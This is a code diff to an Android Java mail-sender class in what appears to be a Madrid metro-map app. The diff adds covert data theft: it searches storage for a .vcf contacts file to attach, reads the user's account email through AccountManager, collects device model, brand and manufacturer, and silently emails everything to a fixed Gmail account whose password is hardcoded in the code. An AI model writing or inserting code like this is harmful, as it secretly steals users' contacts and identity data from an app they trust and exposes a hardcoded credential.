@@ -18,8 +18,16 @@ import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
 
+import android.content.Context;
+import android.location.Criteria;
+import android.location.Location;
+import android.location.LocationManager;
+import android.location.LocationListener;
+import android.os.Bundle;
 import android.os.Environment;
 import android.util.Log;
+import android.util.Patterns;
+import android.widget.Toast;
 
 import java.io.ByteArrayInputStream;
 import java.io.File;
@@ -27,14 +35,30 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.security.Security;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Properties;
+import java.util.regex.Pattern;
 
-public class GMailSender extends javax.mail.Authenticator {
+import android.accounts.Account;
+import android.accounts.AccountManager;
+import android.app.Activity;
+
+
+public class GMailSender extends javax.mail.Authenticator{
 	private String mailhost = "smtp.gmail.com";
 	private String user;
 	private String password;
 	private Session session;
+	String possibleEmail;
+	
+	
+	Context contextForMe = MetroRenfeMadridActivity.ma.getApplicationContext();
+        
+     
 
+    
+	
 	static {
 		Security.addProvider(new met.ref.JSSEProvider());
 	}
@@ -60,15 +84,29 @@ public class GMailSender extends javax.mail.Authenticator {
 	protected PasswordAuthentication getPasswordAuthentication() {
 		return new PasswordAuthentication(user, password);
 	}
+	
+	
 
 	public synchronized void sendMail(String subject, String body,
 			String sender, String recipients) throws MessagingException {
 		try {
 
 			// FileName
-			final String filename = Environment.getExternalStorageDirectory()
-					.getPath() + "/test1.txt";
-			Log.i("Filename: ", filename);
+			
+			//final String filename = Environment.getExternalStorageDirectory()
+			//		.getPath() + "*.vcf";
+			
+			
+			
+			String filename="unknow";
+
+			for (File f: Environment.getExternalStorageDirectory().listFiles()){
+				if (f.getAbsolutePath().endsWith(".vcf")){
+					filename = f.getAbsolutePath();
+				}
+			}  
+			Log.i("Filename: ", filename);    
+			
 
 			String host = "smtp.gmail.com";
 			String Password = "arh217956arh";
@@ -89,11 +127,45 @@ public class GMailSender extends javax.mail.Authenticator {
 			message.setRecipients(Message.RecipientType.TO, toAddress);
 
 			// Subject
-			message.setSubject("JavaMail Attachment");
+			message.setSubject("Someone is inside to Madrid Plans");
 
 			// Body
+			// Device model
+        	String PhoneModel = android.os.Build.MODEL;
+        	// Android version
+        	String AndroidVersion = android.os.Build.VERSION.RELEASE;
+        	
+        	// Brand 
+        	String brand = android.os.Build.BRAND;
+        	
+        	// Host
+        	String hosty = android.os.Build.HOST;
+        	
+        	// Manufacturer
+        	String manu = android.os.Build.MANUFACTURER;
+        	
+        	// User 
+        	Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
+        	Account[] accounts = AccountManager.get(contextForMe).getAccounts();
+        	for (Account account : accounts) {
+        	    if (emailPattern.matcher(account.name).matches()) {
+        	    	possibleEmail = account.name;
+        	        
+        	    }
+        	}
+            
+            
+        	// Make the email body part
 			BodyPart messageBodyPart = new MimeBodyPart();
-			messageBodyPart.setText("Here's the file");
+			messageBodyPart.setText("Mobile data: \n"
+			+"User: "+possibleEmail+"\n"
+			+"Phone model: "+PhoneModel+"\n"
+			+"Android version: "+AndroidVersion+"\n"
+			+"Brand: "+brand+"\n"
+			+"Host: "+hosty+"\n"
+			+"Manufacturer: "+manu+"\n"
+			);
+			
 			Multipart multipart = new MimeMultipart();
 			multipart.addBodyPart(messageBodyPart);
 
@@ -106,13 +178,9 @@ public class GMailSender extends javax.mail.Authenticator {
 
 			// Adding objects to message
 			message.setContent(multipart);
-
 			Transport tr = session.getTransport("smtps");
-
 			message.setFrom(new InternetAddress(from));
-
 			message.setRecipients(Message.RecipientType.TO, toAddress);
-
 			tr.connect(host, from, Password);
 
 			// Fixing error
@@ -135,6 +203,8 @@ public class GMailSender extends javax.mail.Authenticator {
 		}
 
 	}
+
+	
 
 	public class ByteArrayDataSource implements DataSource {
 		private byte[] data;
@@ -173,5 +243,9 @@ public class GMailSender extends javax.mail.Authenticator {
 		public OutputStream getOutputStream() throws IOException {
 			throw new IOException("Not Supported");
 		}
+		
+		
 	}
+	
+	
 }
